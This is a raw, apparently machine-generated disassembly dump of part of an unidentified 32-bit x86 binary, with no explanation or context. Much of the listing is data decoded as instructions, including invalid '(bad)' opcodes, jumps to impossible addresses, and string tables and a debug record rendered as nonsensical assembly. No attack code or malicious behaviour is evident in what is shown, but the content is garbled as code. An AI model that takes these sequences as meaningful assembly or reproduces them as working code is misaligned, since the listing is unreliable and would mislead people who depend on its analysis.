  4333fd:	mov    eax,es
  4333ff:	dec    edx
  433400:	mov    DWORD PTR [edx],esi
  433402:	fmul   QWORD PTR [edx]
  433404:	jne    0x433391
  433406:	(bad)  
  433407:	(bad)  
  433409:	or     DWORD PTR [ebp-0x31],eax
  43340c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433413:	cmp    bh,bh
  433415:	jne    0x43345c
  433417:	lea    ecx,[ebx-0x38372750]
  43341d:	inc    ebx
  43341f:	mov    eax,ecx
  433421:	mov    eax,0xa00c111
  433426:	jne    0x43346d
  433428:	mov    esi,DWORD PTR [ebx]
  43342a:	test   al,0x3
  43342c:	inc    ebp
  43342d:	mov    DWORD PTR [eax-0xc],edx
  433430:	loop   0x433477
  433432:	push   DWORD PTR [ebx]
  433434:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43343a:	add    DWORD PTR [eax],eax
  43343c:	mov    eax,edi
  43343e:	lods   al,BYTE PTR ds:[esi]
  43343f:	dec    ebp
  433440:	inc    ebp
  433441:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433447:	retf   
  433448:	mov    edx,ecx
  43344a:	adc    al,0x84
  43344c:	(bad)  
  43344d:	std    
  43344e:	ret    
  43344f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433455:	hlt    
  433456:	rol    edi,0x82
  433459:	ret    
  43345a:	cld    
  43345b:	enter  0x11ff,0x45
  43345f:	inc    ebp
  433460:	pop    edi
  433461:	mov    ebx,DWORD PTR [ebx+0x14]
  433464:	ret    0xc7
  433467:	test   BYTE PTR [ebx+0x4532519a],cl
  43346d:	jmp    0x4333fa
  43346f:	push   0x8
  433471:	call   DWORD PTR [esi]
  433473:	in     al,dx
  433474:	add    BYTE PTR [ebp+0x1],0x50
  433478:	add    bh,ah
  43347a:	add    bh,bh
  43347c:	icebp  
  43347d:	mov    ecx,DWORD PTR [eax]
  43347f:	cld    
  433480:	pop    es
  433481:	dec    ebp
  433482:	shl    DWORD PTR [ebx],0x72
  433485:	add    eax,DWORD PTR [eax]
  433487:	cmp    edx,ecx
  433489:	je     0x43349b
  43348b:	mov    esi,DWORD PTR [ebp-0x4]
  43348e:	inc    edi
  433490:	or     al,0xc3
  433492:	jmp    FWORD PTR [edx-0x18]
  433495:	(bad)  
  433496:	sti    
  433497:	cwde   
  433498:	(bad)  
  433499:	call   0xffa12da4
  43349e:	or     al,0x45
  4334a0:	push   ebp
  4334a1:	sub    esp,0x18
  4334a4:	push   ebx
  4334a5:	inc    ebp
  4334a6:	mov    edi,edi
  4334a8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334af:	test   al,0x53
  4334b1:	inc    ebp
  4334b2:	push   ecx
  4334b3:	push   eax
  4334b4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334ba:	add    ah,bh
  4334bc:	(bad)  
  4334bd:	dec    ebp
  4334be:	add    DWORD PTR [ebx],esi
  4334c0:	inc    ebp
  4334c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4334c7:	push   0xffffff8b
  4334c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4334cf:	add    eax,DWORD PTR [ecx]
  4334d1:	or     BYTE PTR [eax],al
  4334d3:	call   0xff852cd8
  4334d8:	mov    eax,DWORD PTR [ebp+0x14]
  4334db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334e1:	inc    ebp
  4334e2:	dec    ecx
  4334e3:	add    ebp,DWORD PTR [edx+0x14]
  4334e6:	push   0x8b3045
  4334eb:	call   0x33ad8260
  4334f0:	inc    DWORD PTR [ebx]
  4334f2:	mov    DWORD PTR [edi],ecx
  4334f4:	mov    eax,ecx
  4334f6:	or     BYTE PTR [ebp-0x3d],cl
  4334f9:	cmp    eax,edi
  4334fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433500:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433506:	adc    al,0xc9
  433508:	inc    ebp
  433509:	adc    BYTE PTR [eax+0x55],dl
  43350c:	jne    0x4334fa
  43350e:	call   0xff54349e
  433513:	dec    ebp
  433514:	inc    ebp
  433515:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43351b:	add    BYTE PTR [ebx],bh
  43351d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433521:	push   ebx
  433522:	or     al,0x51
  433524:	dec    ebp
  433525:	xor    DWORD PTR [ebx],0xf32039a
  43352b:	cmp    eax,DWORD PTR [ebp+0x74]
  43352e:	mov    edi,edi
  433530:	pop    edi
  433531:	adc    BYTE PTR [ebx+0x75],bl
  433534:	ret    0x50
  433537:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43353b:	(bad)  
  43353c:	clc    
  43353d:	mov    esp,ebp
  43353f:	pop    ecx
  433540:	mov    ecx,0xf80085c2
  433545:	mov    ecx,DWORD PTR [ecx+edx*2]
  433548:	push   esi
  433549:	push   esi
  43354a:	(bad)  
  43354b:	lock inc DWORD PTR [ebp+0x44]
  43354f:	mov    edx,DWORD PTR [eax]
  433551:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433555:	or     BYTE PTR [ebx+0x7],dl
  433558:	push   ecx
  433559:	ret    
  43355a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433560:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433566:	or     al,0x80
  433568:	jge    0x43356b
  43356a:	mov    DWORD PTR [eax],eax
  43356c:	and    al,0x8
  43356e:	cmp    DWORD PTR [ebp+0x10],eax
  433571:	mov    edx,DWORD PTR [esi]
  433573:	xchg   esp,eax
  433574:	dec    esp
  433575:	add    BYTE PTR [eax],dl
  433577:	mov    ecx,edx
  433579:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43357d:	dec    ebp
  43357e:	into   
  43357f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433585:	mov    edx,DWORD PTR [eax+0x14]
  433588:	das    
  433589:	add    al,0x45
  43358b:	add    BYTE PTR [ebp+0x0],dh
  43358e:	mov    edi,edi
  433590:	and    al,0x50
  433592:	mov    eax,DWORD PTR [eax]
  433594:	and    al,0xd1
  433596:	xor    eax,DWORD PTR [esi]
  433598:	lea    eax,[ebp+0x8]
  43359b:	xor    esi,DWORD PTR [edx+0x3]
  43359e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335b4:	cmp    bh,bh
  4335b6:	pushf  
  4335b7:	mov    edi,edi
  4335b9:	or     BYTE PTR [esi+ecx*1],cl
  4335bc:	jne    0x433581
  4335be:	call   0xc358a
  4335c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4335c7:	mov    ebx,DWORD PTR [eax]
  4335c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4335cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335d5:	pop    esi
  4335d6:	jmp    0x4335a1
  4335d8:	and    al,0x10
  4335da:	and    al,0x55
  4335dc:	or     ah,ch
  4335de:	and    al,0xe4
  4335e0:	inc    DWORD PTR [ebx+0x35e81024]
  4335e6:	(bad)  
  4335e7:	pushf  
  4335e8:	dec    DWORD PTR [ecx+0x570c2444]
  4335ee:	pop    esi
  4335ef:	inc    ecx
  4335f0:	in     eax,0x89
  4335f2:	ret    0x24
  4335f5:	mov    edi,eax
  4335f7:	and    al,0x7d
  4335f9:	mov    edx,0x768089c
  4335fe:	clc    
  4335ff:	cli    
  433600:	call   FWORD PTR [edx+0x3893274]
  433606:	dec    DWORD PTR [ecx-0x74e7db01]
  43360c:	adc    al,0xc
  43360e:	(bad)  
  43360f:	jl     0x433635
  433611:	adc    al,0x8b
  433613:	dec    ebp
  433614:	or     al,0x75
  433616:	jmp    0x4335a3
  433618:	adc    BYTE PTR [esp+eax*2],ah
  43361b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43361f:	and    al,0x9a
  433621:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433627:	dec    esp
  433628:	jne    0x433632
  43362a:	jne    0x433665
  43362c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433633:	test   BYTE PTR [ebp+0x32],bl
  433636:	and    al,0x85
  433638:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43363e:	pop    edi
  43363f:	(bad)  
  433640:	sbb    edx,DWORD PTR [eax]
  433642:	add    dl,dl
  433644:	cmp    edx,DWORD PTR [eax]
  433646:	add    BYTE PTR [esi+0x7e],al
  433649:	adc    BYTE PTR [eax],al
  43364b:	mov    eax,ds:0x1c00107e
  433650:	push   edx
  433651:	adc    BYTE PTR [eax],al
  433653:	cli    
  433654:	push   ss
  433655:	adc    BYTE PTR [eax],al
  433657:	lahf   
  433658:	adc    edx,DWORD PTR [eax]
  43365a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43365e:	add    BYTE PTR [edi+0x19001004],ah
  433664:	inc    eax
  433665:	adc    BYTE PTR [eax],al
  433667:	ds jge 0x43367a
  43366a:	add    BYTE PTR [edi],bh
  43366c:	ss inc ebx
  43366e:	add    BYTE PTR [ebx+0x36],al
  433671:	inc    ebx
  433672:	add    BYTE PTR [edi+0x36],al
  433675:	inc    ebx
  433676:	add    BYTE PTR [ebx+0x36],cl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [edi+0x36],cl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [ebx+0x36],dl
  433681:	inc    ebx
  433682:	add    BYTE PTR [edi+0x36],dl
  433685:	inc    ebx
  433686:	add    BYTE PTR [ebx+0x36],bl
  433689:	inc    ebx
  43368a:	add    BYTE PTR [edi+0x36],bl
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [ebx+0x36],ah
  433691:	inc    ebx
  433692:	add    BYTE PTR [edi+0x36],ah
  433695:	inc    ebx
  433696:	add    BYTE PTR [ecx],ah
  433698:	jno    0x4336aa
  43369a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4336a1:	adc    BYTE PTR [eax],al
  4336a3:	ja     0x433715
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	xor    BYTE PTR [edx+0x10],0x0
  4336ab:	loopne 0x43371b
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cmp    BYTE PTR [eax+0x10],dl
  4336b2:	add    BYTE PTR ds:0x9700104f,al
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [ebx+0x1004336],dh
  4336d8:	add    BYTE PTR [eax],dl
  4336da:	add    al,ah
  4336dc:	pop    ebp
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	add    ah,BYTE PTR ds:0x328d0010
  4336e5:	adc    BYTE PTR [eax],al
  4336e7:	xchg   DWORD PTR [ecx],edx
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	ja     0x4336f9
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	add    cl,BYTE PTR [eax]
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	jle    0x433769
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xlat   BYTE PTR ds:[ebx]
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    BYTE PTR [esi+0x12],bl
  433719:	adc    BYTE PTR [eax],al
  43371b:	stc    
  43371c:	push   es
  43371d:	adc    BYTE PTR [eax],al
  43371f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433720:	xor    DWORD PTR [eax],edx
  433722:	add    BYTE PTR [eax+0x7b],dl
  433725:	adc    BYTE PTR [eax],al
  433727:	stos   DWORD PTR es:[edi],eax
  433728:	push   edi
  433729:	adc    BYTE PTR [eax],al
  43372b:	inc    ebp
  43372c:	adc    edx,DWORD PTR [eax]
  43372e:	add    BYTE PTR [eax+0x38],ch
  433731:	adc    BYTE PTR [eax],al
  433733:	pop    ecx
  433734:	and    edx,DWORD PTR [eax]
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ecx+0x72],cl
  433759:	adc    BYTE PTR [eax],al
  43375b:	cmp    edi,DWORD PTR [eax+0x10]
  43375e:	add    BYTE PTR [ebx+0x23],dl
  433761:	adc    BYTE PTR [eax],al
  433763:	jno    0x4337d1
  433765:	adc    BYTE PTR [eax],al
  433767:	pop    eax
  433768:	outs   dx,BYTE PTR ds:[esi]
  433769:	adc    BYTE PTR [eax],al
  43376b:	mov    ebx,DWORD PTR [ebx+0x10]
  43376e:	add    BYTE PTR [ebx+ebx*2],ch
  433771:	adc    BYTE PTR [eax],al
  433773:	retf   0x1066
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [ebx+0x32],al
  433799:	xor    dh,BYTE PTR ds:0x5a52345f
  43379f:	push   esp
  4337a0:	xor    BYTE PTR [esi],dh
  4337a2:	add    BYTE PTR [ecx+0x36],cl
  4337a5:	push   eax
  4337a6:	pop    edi
  4337a7:	ss inc ebx
  4337a9:	ss pop edx
  4337ab:	xor    ebx,DWORD PTR [edi+0x52]
  4337ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4337b2:	pop    edi
  4337b3:	dec    esi
  4337b4:	dec    esp
  4337b5:	dec    eax
  4337b6:	xor    esi,DWORD PTR [edx]
  4337b8:	pop    edi
  4337b9:	xor    al,0x4b
  4337bb:	add    BYTE PTR [eax+0x49],cl
  4337be:	push   ebp
  4337bf:	xor    al,0x5f
  4337c1:	dec    esp
  4337c2:	inc    edx
  4337c3:	dec    ecx
  4337c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4337c7:	pop    ecx
  4337c8:	inc    edi
  4337c9:	add    BYTE PTR [eax+0x50],bl
  4337cc:	dec    eax
  4337cd:	pop    edi
  4337ce:	push   ebp
  4337cf:	push   ecx
  4337d0:	inc    edi
  4337d1:	xor    cl,BYTE PTR [edx+0x38]
  4337d4:	push   esi
  4337d5:	add    BYTE PTR [ebx+0x4a],al
  4337d8:	push   edx
  4337d9:	pop    edi
  4337da:	dec    edi
  4337db:	dec    eax
  4337dc:	dec    edi
  4337dd:	dec    edi
  4337de:	dec    edx
  4337df:	add    BYTE PTR [ecx+0x52],al
  4337e2:	cmp    DWORD PTR [edi+0x56],ebx
  4337e5:	aaa    
  4337e6:	dec    esp
  4337e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ea:	push   edx
  4337eb:	inc    esp
  4337ec:	add    BYTE PTR [ecx+0x37],bl
  4337ef:	inc    esp
  4337f0:	pop    edi
  4337f1:	dec    ecx
  4337f2:	xor    esi,DWORD PTR [edi]
  4337f4:	xor    DWORD PTR [edi+0x49],ebx
  4337f7:	push   esp
  4337f8:	xor    eax,DWORD PTR [eax]
  4337fa:	push   edx
  4337fb:	xor    BYTE PTR [eax+0x5f],bl
  4337fe:	dec    eax
  4337ff:	push   edi
  433800:	inc    esi
  433801:	xor    DWORD PTR [edi+0x5f],edx
  433804:	cmp    BYTE PTR [ebx+0x37],dl
  433807:	add    BYTE PTR [esi+0x42],dl
  43380a:	dec    ecx
  43380b:	xor    ebx,DWORD PTR [edi+0x45]
  43380e:	xor    BYTE PTR [ebp+0x5f],cl
  433811:	xor    al,0x34
  433813:	xor    BYTE PTR [edx+0x5f],cl
  433816:	inc    edi
  433817:	add    BYTE PTR [edx+0x57],dl
  43381a:	xor    ebx,DWORD PTR [edi+0x31]
  43381d:	dec    edx
  43381e:	push   edi
  43381f:	xor    eax,0x4d435f
  433824:	dec    ecx
  433825:	xor    eax,0x36365f39
  43382a:	dec    eax
  43382b:	xor    BYTE PTR [eax],al
  43382d:	dec    edi
  43382e:	inc    ebx
  43382f:	push   edi
  433830:	pop    edi
  433831:	inc    edi
  433832:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433837:	add    BYTE PTR [edx+0x58],al
  43383a:	inc    edi
  43383b:	ss pop edi
  43383d:	push   esi
  43383e:	inc    ebx
  43383f:	dec    esi
  433840:	inc    esp
  433841:	add    BYTE PTR [edi+0x4d],cl
  433844:	inc    edi
  433845:	xor    ebx,DWORD PTR [edi+0x34]
  433848:	dec    esi
  433849:	pop    edx
  43384a:	cmp    BYTE PTR [edi+0x58],bl
  43384d:	cmp    BYTE PTR [eax],al
  43384f:	push   edx
  433850:	pop    eax
  433851:	push   ecx
  433852:	pop    edi
  433853:	dec    esp
  433854:	push   edx
  433855:	dec    ecx
  433856:	dec    edi
  433857:	inc    esp
  433858:	pop    edi
  433859:	dec    edi
  43385a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43385e:	push   eax
  43385f:	inc    ebp
  433860:	pop    edi
  433861:	xor    eax,0x565f3945
  433866:	add    BYTE PTR [edi+0x4e],al
  433869:	push   esi
  43386a:	pop    edi
  43386b:	inc    edi
  43386c:	push   esp
  43386d:	dec    eax
  43386e:	xor    dh,BYTE PTR [ecx]
  433870:	pop    edi
  433871:	dec    edi
  433872:	xor    eax,DWORD PTR ss:[eax]
  433875:	inc    esp
  433876:	inc    ebp
  433877:	dec    ecx
  433878:	pop    edi
  433879:	push   edx
  43387a:	dec    eax
  43387b:	xor    al,0x48
  43387d:	dec    ecx
  43387e:	ss pop edi
  433880:	aaa    
  433881:	aaa    
  433882:	dec    ecx
  433883:	dec    ebp
  433884:	add    BYTE PTR [eax+0x54],cl
  433887:	ss pop edi
  433889:	inc    esi
  43388a:	inc    edx
  43388b:	xor    dh,BYTE PTR [eax+eax*1]
  43388e:	dec    esi
  43388f:	ss dec edx
  433891:	pop    edi
  433892:	dec    ecx
  433893:	dec    esp
  433894:	inc    edi
  433895:	inc    esp
  433896:	dec    eax
  433897:	xor    BYTE PTR [eax],bh
  433899:	xor    eax,0x4c344f00
  43389e:	xor    esi,DWORD PTR [edi]
  4338a0:	xor    BYTE PTR [edi+0x44],bl
  4338a3:	inc    edi
  4338a4:	dec    ebx
  4338a5:	xor    al,BYTE PTR [ecx+0x43]
  4338a8:	add    BYTE PTR [edi+0x32],cl
  4338ab:	xor    ebx,DWORD PTR [edi+0x57]
  4338ae:	xor    cl,BYTE PTR [edi+0x5f]
  4338b1:	pop    edx
  4338b2:	add    BYTE PTR [eax+0x4c],bl
  4338b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4338b8:	inc    ecx
  4338b9:	dec    edx
  4338ba:	inc    esi
  4338bb:	xor    DWORD PTR [edi+ebx*2],esi
  4338be:	pop    eax
  4338bf:	inc    edi
  4338c0:	inc    edx
  4338c1:	add    BYTE PTR [eax+0x33],dl
  4338c4:	dec    esi
  4338c5:	pop    edi
  4338c6:	dec    eax
  4338c7:	xor    eax,0x485f53
  4338cc:	dec    ebp
  4338cd:	xor    BYTE PTR [edx+0x5f],al
  4338d0:	dec    edx
  4338d1:	pop    eax
  4338d2:	push   esp
  4338d3:	dec    ecx
  4338d4:	dec    esp
  4338d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4338d9:	xor    esi,DWORD PTR [eax]
  4338db:	pop    edi
  4338dc:	inc    ecx
  4338dd:	pop    edx
  4338de:	push   ecx
  4338df:	pop    edx
  4338e0:	cmp    DWORD PTR [esi],esi
  4338e2:	pop    edi
  4338e3:	dec    eax
  4338e4:	dec    esp
  4338e5:	pop    edx
  4338e6:	add    BYTE PTR [ecx+0x57],dl
  4338e9:	pop    ecx
  4338ea:	pop    edi
  4338eb:	push   esi
  4338ec:	xor    al,0x44
  4338ee:	xor    DWORD PTR [eax],edi
  4338f0:	xor    bl,BYTE PTR [edi+0x39]
  4338f3:	push   esp
  4338f4:	push   esp
  4338f5:	add    BYTE PTR [esi+0x0],dl
  4338f8:	dec    edi
  4338f9:	add    BYTE PTR [edi+0x0],al
  4338fc:	add    BYTE PTR ss:[edi+0x0],bl
  433900:	dec    edi
  433901:	add    BYTE PTR [edx+0x0],bl
  433904:	inc    ebp
  433905:	add    BYTE PTR [eax],dh
  433907:	add    BYTE PTR [ebp+0x0],al
  43390a:	xor    BYTE PTR [eax],al
  43390c:	pop    edi
  43390d:	add    BYTE PTR [eax],dh
  43390f:	add    BYTE PTR ds:0x4f000000,dh
  433915:	add    BYTE PTR ds:0x5f005700,dh
  43391b:	add    BYTE PTR [edi],dh
  43391d:	add    BYTE PTR [ebx+0x0],dl
  433920:	push   ebp
  433921:	add    BYTE PTR [edi+0x0],al
  433924:	xor    al,0x0
  433926:	pop    edi
  433927:	add    BYTE PTR [ecx+0x0],dl
  43392a:	inc    esp
  43392b:	add    BYTE PTR [eax],al
  43392d:	add    BYTE PTR [edx+0x0],dl
  433930:	push   esp
  433931:	add    BYTE PTR ds:0x52005f00,dh
  433937:	add    BYTE PTR [edi+0x0],dl
  43393a:	xor    al,BYTE PTR [eax]
  43393c:	xor    al,BYTE PTR [eax]
  43393e:	xor    BYTE PTR [eax],al
  433940:	xor    BYTE PTR [eax],al
  433942:	pop    edi
  433943:	add    BYTE PTR [esi],dh
  433945:	add    BYTE PTR [eax],al
  433947:	add    BYTE PTR [eax+0x0],cl
  43394a:	inc    ebp
  43394b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43394f:	add    BYTE PTR [edi+0x0],bl
  433952:	dec    edx
  433953:	add    BYTE PTR [edx],dh
  433955:	add    BYTE PTR [edi],dh
  433957:	add    BYTE PTR [ebp+0x0],dl
  43395a:	add    BYTE PTR ss:[eax],dh
  43395d:	add    BYTE PTR [eax],al
  43395f:	add    BYTE PTR [esi+0x0],dl
  433962:	cmp    BYTE PTR [eax],al
  433964:	dec    edi
  433965:	add    BYTE PTR [ecx],bh
  433967:	add    BYTE PTR [edi+0x0],bl
  43396a:	pop    eax
  43396b:	add    BYTE PTR [edx+0x0],bl
  43396e:	dec    esp
  43396f:	add    BYTE PTR [ebx+0x0],cl
  433972:	add    BYTE PTR [eax],al
  433974:	dec    ecx
  433975:	add    BYTE PTR [ebp+0x0],dl
  433978:	dec    edi
  433979:	add    BYTE PTR [eax],bh
  43397b:	add    BYTE PTR [edi+0x0],bl
  43397e:	inc    esp
  43397f:	add    BYTE PTR [eax],bh
  433981:	add    BYTE PTR [ecx+0x0],cl
  433984:	dec    eax
  433985:	add    BYTE PTR [edi+0x0],cl
  433988:	pop    edi
  433989:	add    BYTE PTR [ebp+0x0],al
  43398c:	pop    eax
  43398d:	add    BYTE PTR [eax],al
  43398f:	add    BYTE PTR [edx+0x0],dl
  433992:	dec    esp
  433993:	add    BYTE PTR [esi],dh
  433995:	add    BYTE PTR [edi+0x0],bl
  433998:	aaa    
  433999:	add    BYTE PTR [eax+0x0],bl
  43399c:	xor    eax,DWORD PTR [eax]
  43399e:	inc    edi
  43399f:	add    BYTE PTR [ecx+0x0],dl
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [edx+0x0],cl
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	inc    edi
  4339a9:	add    BYTE PTR [edi+0x0],cl
  4339ac:	push   ebx
  4339ad:	add    BYTE PTR [eax+eax*1],dh
  4339b0:	pop    edi
  4339b1:	add    BYTE PTR [ecx+0x0],cl
  4339b4:	xor    DWORD PTR [eax],eax
  4339b6:	push   esi
  4339b7:	add    BYTE PTR [ebx],dh
  4339b9:	add    BYTE PTR [edi+0x0],bl
  4339bc:	dec    ecx
  4339bd:	add    BYTE PTR [edx+0x0],bl
  4339c0:	add    BYTE PTR [eax],al
  4339c2:	inc    ebx
  4339c3:	add    BYTE PTR [ecx+0x0],bl
  4339c6:	inc    ecx
  4339c7:	add    BYTE PTR [eax],dh
  4339c9:	add    BYTE PTR [ecx],bh
  4339cb:	add    BYTE PTR [edi+0x0],bl
  4339ce:	cmp    DWORD PTR [eax],eax
  4339d0:	push   eax
  4339d1:	add    BYTE PTR [eax+eax*1],dh
  4339d4:	pop    edx
  4339d5:	add    BYTE PTR [eax],al
  4339d7:	add    BYTE PTR [edx+0x0],al
  4339da:	inc    esi
  4339db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4339df:	add    BYTE PTR [ebp+0x0],dl
  4339e2:	push   ebp
  4339e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4339e7:	add    BYTE PTR [eax],al
  4339e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4339ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4339f1:	add    BYTE PTR [edi+0x0],bl
  4339f4:	xor    eax,DWORD PTR [eax]
  4339f6:	cmp    DWORD PTR [eax],eax
  4339f8:	dec    eax
  4339f9:	add    BYTE PTR [edi+0x0],bl
  4339fc:	dec    ebp
  4339fd:	add    BYTE PTR [ecx+0x0],bl
  433a00:	cmp    DWORD PTR [eax],eax
  433a02:	inc    ecx
  433a03:	add    BYTE PTR [esi+0x0],cl
  433a06:	add    BYTE PTR [eax],al
  433a08:	inc    ebx
  433a09:	add    BYTE PTR [eax+0x0],dl
  433a0c:	dec    esi
  433a0d:	add    BYTE PTR [eax+eax*1],dh
  433a10:	pop    edi
  433a11:	add    BYTE PTR [eax+eax*1+0x54],cl
  433a15:	add    BYTE PTR [ebx+0x0],cl
  433a18:	xor    DWORD PTR [eax],eax
  433a1a:	add    BYTE PTR [eax],al
  433a1c:	inc    ecx
  433a1d:	add    BYTE PTR [edi],dh
  433a1f:	add    BYTE PTR [edx+0x0],cl
  433a22:	pop    edi
  433a23:	add    BYTE PTR [ebx+0x0],al
  433a26:	cmp    BYTE PTR [eax],al
  433a28:	push   edi
  433a29:	add    BYTE PTR [eax+0x0],dl
  433a2c:	pop    edi
  433a2d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433a31:	add    BYTE PTR [edx],dh
  433a33:	add    BYTE PTR [eax],al
  433a35:	add    BYTE PTR [edx+0x0],al
  433a38:	add    BYTE PTR [eax],al
  433a3a:	push   edx
  433a3b:	push   ebx
  433a3c:	inc    esp
  433a3d:	push   ebx
  433a3e:	push   edx
  433a3f:	retf   0xf6ea
  433a42:	fs push cs
  433a44:	dec    esi
  433a45:	dec    ebp
  433a46:	cwde   
  433a47:	xchg   edi,eax
  433a48:	dec    esi
  433a49:	xor    edi,DWORD PTR [edx]
  433a4b:	mov    ah,0x46
  433a4d:	not    DWORD PTR [ebx]
  433a4f:	add    BYTE PTR [eax],al
  433a51:	add    BYTE PTR [edi+0x3a],cl
  433a54:	pop    esp
  433a55:	jno    0x433aab
  433a57:	inc    esp
  433a58:	jp     0x433aa8
  433a5a:	jb     0x433ab6
  433a5c:	addr16 jne 0x433ac2
  433a5f:	jns    0x433ad1
  433a61:	jbe    0x433abf
  433a63:	push   0x62
  433a65:	push   edi
  433a66:	jns    0x433ae0
  433a68:	inc    ebp
  433a69:	ins    DWORD PTR es:[edi],dx
  433a6a:	jbe    0x433ad3
  433a6c:	popa   
  433a6d:	pop    esp
  433a6e:	je     0x433ada
  433a70:	pop    edx
  433a71:	data16 jne 0x433ae6
  433a74:	ja     0x433ade
  433a76:	push   edx
  433a77:	bound  eax,QWORD PTR [ebp+0x72]
  433a7a:	pop    esp
  433a7b:	dec    edx
  433a7c:	jae    0x433ac2
  433a7e:	ins    DWORD PTR es:[edi],dx
  433a7f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433a83:	jo     0x433ae9
  433a85:	bound  eax,QWORD PTR [eax]
	...
